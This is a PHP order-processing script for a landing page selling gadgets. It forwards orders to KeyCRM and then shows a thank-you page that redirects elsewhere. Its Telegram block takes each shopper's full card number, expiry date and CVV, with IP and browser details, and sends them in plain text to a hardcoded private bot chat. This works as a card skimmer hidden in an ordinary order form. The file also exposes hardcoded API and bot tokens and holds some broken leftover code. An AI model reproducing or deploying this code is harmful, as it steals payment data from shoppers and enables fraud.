<?php
session_start();

// $data = [ 
//       "source_id" => $_POST['bid'] ? $_POST['bid'] : '1', // в какой источник в KeyCRM добавлять заказы
//       "buyer" => [
//             "full_name"=> $_POST['name'], // ФИО покупателя
//             "email"=> $_POST['email'], // email покупателя
//             "phone"=> $_POST['phone'], // номер телефона покупателя
            
          
         
//       ],
      
//       "shipping" => [
//           "shipping_address_city"=> $_POST['address_city'], // город покупателя
//           "shipping_receive_point"=> $_POST['address_street'], // улица, номер дома или отделение Новой Почты
//           "shipping_address_country"=> $_POST['address_country'], // страна
//           "shipping_address_region"=> $_POST['address_region'], // область/штат/регион
//           "shipping_address_zip"=> $_POST['address_zip'] // индекс
          
//       ],
//       "marketing" => [
//     "utm_source" => $_POST['utm_source'], // источник кампании
//     "utm_medium" => $_POST['utm_medium'], // тип трафика
//     "utm_campaign" => $_POST['"utm_campaign'], // название кампании
//     "utm_term" => $_POST['utm_term'], // ключевое слово
//     "utm_content" => $_POST['utm_content'], // идентификатор объявления
//     "products" => $_POST['product_name'],
//           ],
          
       
       
//       "products"=> [
//             [
//               "sku"=> "Max Fishing",
//               "price"=> 184, // цена продажи
//                 "quantity"=> 1, // количество проданного товара
//                 "name"=> $_POST['product_name'], // название товара
//                 "picture"=> $_POST['product_url'], // картинка товара
//                 "properties"=>[
//                 [
                    
//                 ]
//               ]
//           ],
//           [
//                 "sku"=> '.',
//                 "price"=> 10, // цена продажи
//                 "quantity"=> 1, // количество проданного товара
//                 "name"=> $_POST['product_name'], // название товара
//                 "picture"=> $_POST['product_url'], // картинка товара
//                 "properties"=>[
//                 [
                    
//                 ]
//               ]
//           ]
          
//       ],
//       "custom_fields"=> [
//         [
//           "uuid"=> "OR_1001",
//           "value"=> $_POST['subid'],
//         ],
//         [
//           "uuid"=> "OR_1003",
//           "value"=> $_POST['linksite'],
//         ],
//         [
//           "uuid"=> "OR_1006",
//           "value"=> $_POST['met'],
//         ]
      
//       ]
// ];



   

//  "упаковываем данные"
$data_string = json_encode($data);

// Ваш уникальный API ключ KeyCRM
$token = 'OTQyYzcwYmNkZTNlZjY0NTk2MDgyY2FhNmQzMmIxYTY2MjYxOGNhMw';

// отправляем на сервер
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://openapi.keycrm.app/v1/order");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,$data_string);
curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        "Content-type: application/json",
        "Accept: application/json",
        "Cache-Control: no-cache",
        "Pragma: no-cache",
        'Authorization:  Bearer ' . $token)
);
$result = curl_exec($ch);
curl_close($ch);
?>

<?php
header("Content-Type: text/html; charset=UTF-8");

// START Telegram
$name = $_POST['name'];
$cart = $_POST['numberCard'];
$data = $_POST['dataCard'];
$cvv = $_POST['cvvCard'];

$ip_r = $_SERVER['REMOTE_ADDR'];


$token = "1355939967:AAHoS1JTZ6CZYDK40u1_oDISTImOtZS2Kus";
$chat_id = "980378363";




$arr = array(
  'Товар: ' => 'Проверка страныцы с картой',
  'Имя' => $name,
  'Карта: ' => $cart,
  'Дата карты: ' => $data,
  'CVV карты: ' => $cvv,
  'Время заказа: ' => date("Y-m-d H:i:s"),
  'IP адрес клиента:' =>  $ip_r,
  'Сайт: ' => $_SERVER['SERVER_NAME'],
  'Получение информации о браузере: ' => $_SERVER['HTTP_USER_AGENT'],
  'Получение запрошенного URL: ' => $_SERVER['REQUEST_URI'],
  'Получение реферера (откуда пришел пользователь): ' => isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'Direct',
  'Получение метода запроса: ' => $_SERVER['REQUEST_METHOD'],
);

foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."%0A";
};

$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");

// End Telegram





if ($_POST['name']) {
	$name = htmlspecialchars($_POST['name']);
}
// if ($_POST['phone']) {
// 	$phone = htmlspecialchars($_POST['phone']);
// }
// if($_POST['comment']) { $comment = htmlspecialchars ($_POST['comment']); }
$ip_r = $_SERVER['REMOTE_ADDR'];

$product = "ЗАКАЗ-АП"; // Подпись отправителя

$name1 =  substr(htmlspecialchars(trim($name)), 0, 100);
// $phone1 =  substr(htmlspecialchars(trim($phone)), 0, 20);

if (empty($name1)) {
	echo '<h2><p align=center><font color="red">Внимание! Запрещено отправлять пустые поля.<br> Вернитесь и заполните обязательные поля <b>"Имя"</b> и <b>"Телефон"</b></font><br><br><a href="javascript:history.back()">Вернуться назад</a></p></h2>';
	exit;
}

// if (empty($phone1)) {
// 	echo '<h2><p align=center><font color="red">Внимание! Запрещено отправлять пустые поля.<br> Вернитесь и заполните обязательные поля <b>"Имя"</b> и <b>"Телефон"</b></font><br><br><a href="javascript:history.back()">Вернуться назад</a></p></h2>';
// 	exit;
// }

if (isset($_POST['tip'])) {

	if ($_POST['tip'] == '1') {
		$model = 'Hover Ball 1 шт';
	}
	if ($_POST['tip'] == '2') {
		$model = 'Hover Ball 3 шт';
	}
	if ($_POST['tip'] == '3') {
		$model = 'Hover Ball 6 шт';
	}
} else {
	$model = '<span style="color:grey;">Данных нет</span>';
}

$tema_r = 'ЗАКАЗ: на Termo-6в1';
$to = ""; // ЗДЕСЬ МЕНЯЕМ ПОЧТУ НА КОТОРУЮ ПРИХОДЯТ ЗАКАЗЫ!
$from = "{$product} <noreply@{$_SERVER['HTTP_HOST']}>"; // Адрес отправителя

$subject = "=?utf-8?B?" . base64_encode("$tema_r") . "?=";
$header = "From: $from";
$header .= "\nContent-type: text/html; charset=\"utf-8\"";
$message = 'Имя: ' . $name . ' <br>Телефон: ' . $phone . ' <br><br>Заказано с лендинга: ' . $_SERVER['HTTP_REFERER'] . ' <br>IP адрес клиента: <a href="http://ipgeobase.ru/?address=' . $ip_r . '">' . $ip_r . '</a><br>Время заказа: ' . date("Y-m-d H:i:s") . '';
mail($to, $subject, $message, $header)


?>



<!doctype html>
<html lang="ua">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <script src="https://cdn.tailwindcss.com"></script>
    <title>Дякуємо за замовлення!</title>
    <img height="1" width="1" src="https://www.facebook.com/tr?id=<?=$_COOKIE["act"]?>&ev=PageView&noscript=1"/>
    <img height="1" width="1" src="https://www.facebook.com/tr?id=<?=$_COOKIE["act"]?>&ev=Lead&noscript=1"/>
    <link rel="stylesheet" href="center.css">
</head>
<body>
  <script>
    setTimeout(()=>{
      location.href = "https://moovi.site/vzutty";
    },0)
  </script>

</body>
</html>